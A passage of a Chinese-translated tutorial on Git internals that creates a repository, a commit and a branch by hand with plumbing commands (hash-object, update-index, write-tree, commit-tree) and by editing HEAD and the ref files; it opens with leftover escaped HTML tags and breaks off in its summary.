;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt; 目录中的很多东西已经变了"></p><p>很明显，很多东西都变了。是时候深入 <code>.git</code> 的结构，理解执行 <code>git init</code>、<code>git add</code> 或 <code>git commit</code> 之后发生的什么事情了。</p><p><strong>是时候上干货了</strong></p><p>目前我们已经讲了一些 Git 的基础知识，现在已经做好 <em>Git 上路</em> 的准备了。</p><p>为了深入理解 <code>git</code> 是如何工作的，我们将从零开始创建一个 <strong>仓库</strong>。</p><p>我们不会使用 <code>git init</code>、<code>git add</code> 或 <code>git commit</code>，这会让我们更好地理解这个过程。</p><h1 id="如何设置-git"><a href="#如何设置-git" class="headerlink" title="如何设置 .git"></a>如何设置 <code>.git</code></h1><p>先创建一个新目录，然后在里面运行 <code>git status</code>：</p><p><img src="https://camo.githubusercontent.com/f0c46031e68c1ba8177c25210b82e7900911fe80815bf6335657fa9a1afd975a/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3130362e706e67"></p><p>好吧，因为我们没有 <code>.git</code> 文件夹，<code>git</code> 好像不怎么高兴。我们先把这个目录创建出来：</p><p><img src="https://camo.githubusercontent.com/2d3f6914bdb84144ebc7285841388991bd688534c5fb8cc9136d11a2477428ba/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3130372e706e67"></p><p>很明显，只创建一个 <code>.git</code> 目录还不够。我们需要往这个目录添加一些东西。</p><p><strong>一个 git 仓库有两个主要组成部分：</strong></p><ol><li>一组对象——<strong>blob</strong>、<strong>树对象</strong> 和 <strong>提交对象</strong>。</li><li>一个命名这些对象的方式——称为 <strong>引用</strong>。</li></ol><blockquote><p>译者注：引用是 Git 中的一个重要概念，读者可以进一步阅读 <a href="https://git-scm.com/book/zh/v2/Git-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86-Git-%E5%BC%95%E7%94%A8">Git 引用</a>。</p></blockquote><p>一个 <strong>仓库</strong> 可能还包含一些其它的东西，比如 git 钩子（hooks）。不过，仓库至少必须要有对象和引用。</p><p>让我们分别为对象和引用（简称：<strong>refs</strong>）各创建一个目录，Windows 下的两个目录分别为 <code>.git\objects</code> 和 <code>.git\refs</code>（UNIX 下的两个目录分别为 <code>.git/objects</code> 和 <code>.git/refs</code>）。</p><p><img src="https://camo.githubusercontent.com/2017908bbf9f87e80b0bec34ca6c78c4971beeb5d71c8e7aecca7ba1874f055a/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3130382e706e67"></p><p><strong>分支</strong> 是引用的一种，<code>git</code> 内部将 <strong>分支</strong> 称为 <strong>heads</strong>，所以我们会为它们创建一个目录 <code>git\refs\heads</code>。</p><p><img src="https://camo.githubusercontent.com/3f2e4cdc3b6f59818a6e7300cdacabce7274010c60cac187d0db90b05864e7e4/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3130392e706e67"></p><p>然而 <code>git status</code> 的输出还是纹丝不动：</p><p><img src="https://camo.githubusercontent.com/baac8b0cbedc86d550edb38cf610c2275b1f21f103fc5d9fc44a9d508ba20729/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3131302e706e67"></p><p>在寻找 <strong>仓库</strong> 中的 <strong>提交</strong> 时，<code>git</code> 怎么知道该从何开始呢？我之前解释过，它会寻找 <code>HEAD</code>，而 <code>HEAD</code> 指向着活动分支。</p><p>所以，我们需要创建 <code>HEAD</code>，它是一个位于 <code>.git\HEAD</code> 的文件。我们可以这么做：</p><p>Windows：<code>&gt; echo ref: refs/heads/master &gt; .git\HEAD</code></p><p>UNIX：<code>$ echo &quot;ref: refs/heads/master&quot; &gt; .git/HEAD</code></p><p>⭐ 所以我们现在知道 <code>HEAD</code> 是如何实现的了——它只是一个文件，文件内容描述了它所指向的分支。</p><p>执行上面的命令以后，<code>git status</code> 似乎改变它的主意了：</p><p><img src="https://camo.githubusercontent.com/41a9956e4f2ba1c9e91432c9de8c55d5589c358de7917f8aa23bc6ac45a30bc9/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3131312e706e67" alt="HEAD 只不过是一个文件"></p><p>注意：虽然我们还没有创建 <code>master</code> 分支，但是 <code>git</code> 相信我们就在这个分支上。之前有讲过，<code>master</code>只是一个名字。如果我们想的话，也可以让 <code>git</code> 认为我们在 <code>banana</code> 分支上：</p><p><img src="https://camo.githubusercontent.com/4d5335f0010eee02dc7615658a8203f48bac41a7ea66508f353862ad8d90f0dc/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3131322e706e67"></p><p>按照惯例，我们将在本文的剩余部分中切回 <code>master</code> 分支。</p><p>我们已经准备好了 <code>git</code> 目录，现在继续往下，来一次 <strong>提交</strong>（同样地，不使用 <code>git add</code> 或 <code>git commit</code>）。</p><h1 id="Git-中的底层命令与上层命令"><a href="#Git-中的底层命令与上层命令" class="headerlink" title="Git 中的底层命令与上层命令"></a>Git 中的底层命令与上层命令</h1><p>这个时候，区分 <strong>底层（plumbing）</strong> 和 <strong>上层（poreclain）</strong> 两类 <code>git</code> 命令会对你很有帮助。这两个术语的应用奇怪地来自于马桶（没错，就是🚽）。马桶通常是用陶瓷（porcelain）做的，它的基本结构是管道（plumbing，上水道和下水道）。</p><p>我们可以说上层命令为底层命令提供了一个用户友好的接口。大多数人只会涉及到上层命令。然而，当事情变得（非常）糟糕时，有人可能就会想知道为什么，他们会卷起袖子去检查底层命令。（注意：这些术语并不是我发明的，它们在 <code>git</code> 中的使用非常广泛）。</p><blockquote><p>译者注：读者若想更好的理解这两个术语，建议阅读 <a href="https://git-scm.com/book/zh/v2/Git-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86-%E5%BA%95%E5%B1%82%E5%91%BD%E4%BB%A4%E4%B8%8E%E4%B8%8A%E5%B1%82%E5%91%BD%E4%BB%A4">Git 内部原理 - 底层命令与上层命令</a>。</p></blockquote><p><code>git</code> 使用这些术语进行类比，从而将用户不常使用的底层命令（plumbing）和那些更友好的高层（porcelain）命令区分开。</p><p>目前，我们已经接触过上层命令——<code>git init</code>、<code>git add</code> 和 <code>git commit</code>。接下来，我们转到底层命令。</p><h1 id="如何创建对象"><a href="#如何创建对象" class="headerlink" title="如何创建对象"></a>如何创建对象</h1><p>让我们从创建对象并将其写入 <code>git</code> 的对象数据库开始吧，<code>git</code> 的对象数据库位于 <code>.git\objects</code> 中。第一条底层命令 <code>git hash-object</code> 会让我们将找到 <strong>blob 对象</strong> 的 SHA-1 哈希值。方式如下：</p><p>Windows：</p><p><code>&gt; echo git is awesome | git hash-object --stdin</code></p><p>UNIX：</p><p><code>$ echo &quot;git is awesome&quot; | git hash-object --stdin</code></p><p>我们使用 <code>--stdin</code> 告知 <code>git hash-object</code> 从标准输入（standard input）获取输入内容，这将给我们提供相应的哈希值。</p><p>为了真的将该 <strong>blob 对象</strong> 写入 <code>git</code> 的对象数据库，我们可以简单地给 <code>git hash-object</code> 加一个 <code>-w</code> 开关。然后，检查 <code>.git</code> 目录中的内容，看看它们有没有改变。</p><p><img src="https://camo.githubusercontent.com/cc090cc8b09a6ad48a4c1d89f291077a29105b68f42ed62e51896fcb37436754/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3131332e706e67"></p><p>将一个 blob 对象写入对象数据库</p><p>我们现在可以看到，这个 <strong>blob</strong> 的哈希值为 <code>54f6...36</code>， <code>.git\objects</code> 下也多出来了一个名为 <code>54</code> 的目录，目录内有一个名为 <code>f6..36</code> 的文件。</p><p>所以，<code>git</code> 实际上是使用 SHA-1 哈希值的前两个字符作为目录的名字，剩余字符用作 <strong>blob</strong> 所在文件的文件名。</p><p>为什么要这样呢？考虑一个非常大的仓库，仓库的数据库内存有三十万个对象（<strong>blob 对象</strong>、<strong>树对象</strong> 和 <strong>提交对象</strong>）。从这三十万个哈希值中找出一个值会花些时间，因此，<code>git</code> 将这个问题划分成了 256 份。</p><p>为了查找上面的那个哈希值，<code>git</code> 会先寻找 <code>.git\objects</code> 目录下名为 <code>54</code> 的目录，然后搜索那个目录，这进一步缩小了搜索范围。<code>.git\objects</code> 目录下最多可能会有 256 个子目录（从 <code>00</code> 到 <code>FF</code>）。</p><p>回到生成 <strong>提交对象</strong> 的过程中来，现在我们已经创建了一个对象，它的类型是什么呢？我们可以通过另一个底层命令 <code>git cat-file -t</code> （<code>-t</code> 代表“type”）瞧一瞧：</p><p><img src="https://camo.githubusercontent.com/40b23162d472efe03bb0075b13bbfaf01a4512a945765f6d3013b9f9692b29fb/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3131342e706e67"></p><p>不出所料，这个对象是一个 <strong>blob</strong>。我们还可以使用 <code>git cat-file -p</code> （<code>-p</code> 代表“pretty-print”）查看它的内容：</p><p><img src="https://camo.githubusercontent.com/29d6b3199302734b339b79ed9187b2f2c8c1eace1aa3b7a5bd0690988ed4e0b3/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3131352e706e67"></p><p>创建 <strong>blob</strong> 这个过程通常发生在我们将一些东西添加到 <strong>暂存区</strong> 的时候——也就是我们使用 <code>git add</code> 的时候。</p><p>记住：<code>git</code> 是为 <em>整个</em> 暂存的文件创建 <strong>blob</strong>。即使文件中只有修改或添加了一个字符（如同我们在之前的例子红添加 <code>!</code> 一样），该文件也会有一个新的 <strong>blob</strong>，这个 <strong>blob</strong> 有着新的哈希值。</p><p><code>git status</code> 会有任何改变吗？</p><p><img src="https://camo.githubusercontent.com/578fe0f620ccb2af2ec033b99a88e17f1e5f14e4df3bae31701260c500776c44/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3131362e706e67"></p><p>显然没有。向 <code>git</code> 的内部数据库中添加一个 <strong>blob</strong> 对象并不会改变状态，因为 <code>git</code> 在这个阶段是不知道任何已跟踪或未跟踪文件的。</p><p>我们需要跟踪这个文件——把它添加到 <strong>暂存区</strong>。为此，我们可以使用底层命令 <code>git update-index</code>，例如：<code>git update-index --add --cacheinfo 100644 &lt;blob-hash&gt; &lt;filename&gt;</code>。</p><p>注意：<code>cacheinfo</code> 是一个<a href="https://github.com/git/git/blob/master/Documentation/technical/index-format.txt">git 存储的</a>十六位的文件模式，这个模式遵循 <a href="http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/sys_stat.h.html">POSIX 类型和模式</a> 的布局。这超出了本文讨论的范围。</p><p>运行上述命令会改变 <code>.git</code> 目录的内容：</p><p><img src="https://camo.githubusercontent.com/ae084e692272bca730cc56eaea73d2ebad1e580dcc8fd5bf6428807083e318b3/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3131372e706e67"></p><p>你能发现变化吗？多了一个名为 <code>index</code> 的新文件。这就是著名的 <strong>索引</strong> （或 <strong>暂存区</strong>），它基本上是一个位于 <code>.git\index</code> 中的文件。</p><p>既然 <strong>blob</strong> 已经被添加到了 <strong>索引</strong>，我们希望 <code>git status</code> 看起来会有所不同，像这样：</p><p><img src="https://camo.githubusercontent.com/1c1a83472a402d25e141826a2ceb21afc9b8f61e7a6690af4d56c4bb211f7ada/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3131382e706e67"></p><p>真有趣！这里发生了两件事。</p><p>第一件事，我们可以在 <code>changes to be committed</code> 中看到绿色的 <code>new_file.txt</code>。这是因为 <strong>索引</strong> 中有了 <code>new_file.txt</code>，它正等着被提交。</p><p>第二件事，我们可以看到红色的 <code>new_file.txt</code>——因为 <code>git</code> 相信 <code>my_file.txt</code> 这个 <em>文件</em> 已经被删除了，并且它没有被暂存。</p><p>这发生在我们将内容为 <code>git is awesome</code> 的 <strong>blob</strong> 添加到对象数据库中的时候，我们告诉 <strong>索引</strong> ，那个 <strong>blob</strong> 的内容在文件 <code>my_file.txt</code> 中，但是我们从未创建过那个文件。</p><p>通过将那个 <strong>blob</strong> 的内容写入我们文件系统中名为 <code>my_file.txt</code> 的文件，我们可以很容易地解决这个问题：</p><p><img src="https://camo.githubusercontent.com/0d4a4af4b155c8955a5103cda67346ba00ccc797e7cbfb000812b0451de421f4/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3131392e706e67"></p><p>执行 <code>git status</code> 后，它将不再出现在红色内容中：</p><p><img src="https://camo.githubusercontent.com/c2b63869333bcee7e5604ca55d31007e8a5a5df9c30b1bb3397b9de7584f6fdf/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3132302e706e67"></p><p>现在是时候从我们的 <strong>暂存区</strong> 创建一个 <strong>提交</strong> 对象了。如上所述，一个 <strong>提交</strong> 对象引用着一个 <strong>树对象</strong>，所以我们需要创建一个 <strong>树对象</strong>。</p><p>我们可以用 <code>git write-tree</code> 做这件事，它会在一个 <strong>树对象</strong> 中记录 <strong>索引</strong> 的内容。当然，我们可以使用 <code>git cat-file -t</code> 进行确认：</p><p><img src="https://camo.githubusercontent.com/fc03201152d03fcf4066801a76b1c7092984f931890faee5b197a604c6ba7686/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3132312e706e67"></p><p>创建索引的树对象</p><p>我们还可以用 <code>git cat-file -p</code> 查看它的内容：</p><p><img src="https://camo.githubusercontent.com/23b16c7b9a43c6fe8e41e2fdab74ec1d69053253f3ba29581dadc29e04157d69/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3132322e706e67"></p><p>太棒了！我们创建了一个 <strong>树对象</strong>，现在我们需要创建一个引用这个 <strong>树对象</strong> 的 <strong>提交</strong> 对象。为此，我们可以使用 <code>git commit-tree &lt;tree-hash&gt; -m &lt;commit message&gt;</code>：</p><p><img src="https://camo.githubusercontent.com/6956c5d036f89b9b4785b51a323f2b38c0fddc3f8d3ae5b1f6471e4d345fbbd4/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3132332e706e67"></p><p>你现在应该对查看对象类型和打印对象内容的命令感到得心应手了：</p><p><img src="https://camo.githubusercontent.com/f0054e82ff5772b5d9041ad9176568448c9836cf537a8c51b23b3c490351b42b/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3132342e706e67"></p><p>创建一个提交对象</p><p>注意这个 <strong>提交</strong> 并没有 <strong>父节点</strong>，因为它是第一个 <strong>提交</strong>。当我们添加另一个 <strong>提交</strong> 时，我们就得声明它的 <strong>父节点</strong>了——我们稍后会做这个。</p><p>我们刚得到的哈希值（<code>80e...8f</code>）是一个 <strong>提交对象</strong> 的哈希值。实际上我们非常习惯使用这些哈希值——我们一直都在看它们。注意这个 <strong>提交对象</strong> 拥有一个 <strong>树对象</strong>，树对象有自己的哈希值，不过我们几乎不会显式地指定这个哈希值。</p><p><code>git status</code> 会有所变化吗？</p><p><img src="https://camo.githubusercontent.com/e670ec69452a4053587d4206ce70f78dece2dd0dbbbe2900716d42b1e73df059/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3132352e706e67"></p><p>并没有。🤔</p><p>为什么呢？<code>git</code> 需要知道最近一次 <strong>提交</strong>，才能知道文件已经被提交。那么 <code>git</code> 是怎么做的呢？它会去找 <code>HEAD</code>：</p><p><img src="https://camo.githubusercontent.com/c19ac6c84cf427cc803394a3b991b9879ae4e340a63dd1a8d6c4bd2b183b4be5/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3132362e706e67"></p><p>在 Windows 上查看 <code>HEAD</code></p><p><img src="https://camo.githubusercontent.com/87a111da9944c7faebc0e81591bd91b4fdb3c8a70ff6c1be6e2cadd5fd5d733d/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3132372e706e67"></p><p>在 UNIX 上查看 <code>HEAD</code></p><p><code>HEAD</code> 指向 <code>master</code>，但是 <code>master</code> 是什么呢？我们还没有创建它呢。</p><p>如同我们在前面解释的那样，分支只是 <strong>提交对象</strong> 的命名引用。这时，我们想要让 <code>master</code> 指向哈希值为 <code>80e8ed4fb0bfc3e7ba88ec417ecf2f6e6324998f</code> 的 <strong>提交对象</strong>。</p><p>这实现起来很简单，在 <code>\refs\heads\master</code> 创建一个文件，文件内容为这个哈希值。像这样：</p><p><img src="https://camo.githubusercontent.com/3de2646b0968021448ea4da5c8dbe05733f1fb003edd5071cf03ed2567ce8b26/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3132382e706e67"></p><p>⭐ 总而言之，<strong>分支</strong> 只是 <code>.git\refs\heads</code> 中的一个文件，文件内容为该分支所指向的 <strong>提交对象</strong> 的哈希值。</p><p>现在，<code>git status</code> 和 <code>git log</code> 终于欣赏我们的付出了：</p><p><img src="https://camo.githubusercontent.com/2e37c264bdd32f3f744d5858c7b0ebef808f95fe6b0fd7087cb8966370209a83/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3132392e706e67"></p><p>我们已经成功创建出了一个 <strong>提交</strong>，全程没有使用上层命令！是不是很酷？🎉</p><h1 id="与-Git-分支一起工作——背后的故事"><a href="#与-Git-分支一起工作——背后的故事" class="headerlink" title="与 Git 分支一起工作——背后的故事"></a>与 Git 分支一起工作——背后的故事</h1><p>就像我们不借助 <code>git init</code>、<code>git add</code> 或 <code>git commit</code> 创建 <strong>仓库</strong> 和 <strong>提交</strong> 一样，我们将要创建 <strong>分支</strong>，在不同 <strong>分支</strong> 间来回切换，整个过程也不使用上层命令（<code>git branch</code> 或 <code>git checkout</code>）。</p><p>如果你很兴奋，这是完全可以理解的。我也很兴奋 🙂</p><p><strong>咱们开始吧：</strong></p><p>目前我们只有一个名为 <code>master</code> 的分支。要创建另一个名为 <code>test</code> 的分支（等价于执行 <code>git branch test</code>），我需要在 <code>.git\refs\heads</code> 下创建一个名为 <code>test</code> 的文件，文件的内容应该和 <code>master</code> 分支指向的那个 <strong>提交</strong> 的哈希值一致。</p><p><img src="https://camo.githubusercontent.com/edd8b9f340f94853bd71237a36c01d9a6beea22f888c2ffbffc678f42561556c/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3133302e706e67"></p><p>如果我们使用 <code>git log</code>，就可以看到 <code>master</code> 和 <code>test</code> 确实是指向同一个 <strong>提交</strong>：</p><p><img src="https://camo.githubusercontent.com/aeb82c32f6b8aec6b72e97cf556d813794fcc4d14c7ae7de7119443ab45d2b19/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3133312e706e67"></p><p>我们也切换到新创建的分支吧（等价于执行 <code>git branch test</code>）。为此，我们需要改变 <code>HEAD</code> 的指向，让它指向我们的新分支：</p><p><img src="https://camo.githubusercontent.com/c6368fbe7ea63d829e0458bd7dc8965b9db3b5165dca60840929cb92f42da871/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3133322e706e67"></p><p>通过修改 <code>HEAD</code> 切换到 <code>test</code> 分支</p><p>我们可以看到：<code>git status</code> 和 <code>git log</code> 都确认 <code>HEAD</code> 现在指向的是 <code>test</code> 分支（活动分支）。</p><p>我们现在可以使用之前的命令去创建另一个文件，然后将它添加到索引：</p><p><img src="https://camo.githubusercontent.com/8f4b2fcc1a016c4107896a8420c937afddd1b6f9039f6bed708b17393178b208/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3133332e706e67"></p><p>我们用上面的命令创建了一个名为 <code>test.txt</code> 的文件，文件内容为 <code>Testing</code>。我们还创建了相应的 <strong>blob</strong>，将它添加了到 <strong>索引</strong>。我们还创建了代表这个 <strong>索引</strong> 的 <strong>树对象</strong>。</p><p>现在是时候创建引用这个 <strong>树对象</strong> 的 <strong>提交</strong> 了。这一次，我们还应该声明这个提交的 _父提交_，也就是之前的那次 <strong>提交</strong>。我们用 <code>git commit-tree</code> 命令的 <code>-p</code> 开关声明父节点：</p><p><img src="https://camo.githubusercontent.com/9e8d5dcc4856cb1bac47534d84da9f726bf8c60bfa9d7a0ab7fd1fc9efae9d5f/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3133362e706e67"></p><p>可以看到，我们刚刚创建了一个 <strong>提交</strong>，还有它的 <strong>树对象</strong> 和父节点：</p><p><img src="https://camo.githubusercontent.com/caf89c99c356a06a40bf4fde9dd448b67634a4ca53cd9a8fa92a6206099be0b6/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3133392e706e67"></p><p><code>git log</code> 会展示我们的新 <strong>提交</strong> 吗？</p><p><img src="https://camo.githubusercontent.com/bce85522f160fe2c207e98a856f482044854ac57587dd5175222509ae3bc691b/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3133382e706e67"></p><p>可以看到：<code>git log</code> 并没有展示任何新的东西。为什么呢？🤔 还记得 <code>git log</code> 会跟踪 <strong>分支</strong> ，查找要展示的相关提交吗？它现在给我们展示了 <code>test</code> 和它指向的那个 <strong>提交</strong>，还展示了指向同一个提交的 <code>master</code>。</p><p>没错，我们需要让 <code>test</code> 指向我们的新 <strong>提交</strong>。我们只需要稍微改变一下 <code>.git\refs\heads\test</code> 的内容：</p><p><img src="https://camo.githubusercontent.com/a8372004f7aab2ac5a0511ccddbcef7f2c9d37d08c79d3813760dd16946510f0/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d3134302e706e67"></p><p>成功了! 🎉🥂</p><p><code>git log</code> 找到 <code>HEAD</code>，<code>HEAD</code> 告诉它去 <code>test</code> 分支，<code>test</code> 分支指向着 <strong>提交</strong> <code>465...5e</code>，这个提交又链接到它的父 <strong>提交</strong> <code>80e...8f</code>。</p><p>尽情欣赏美吧，we <em>git</em> you。 😊</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文向你介绍了 <code>git</code> 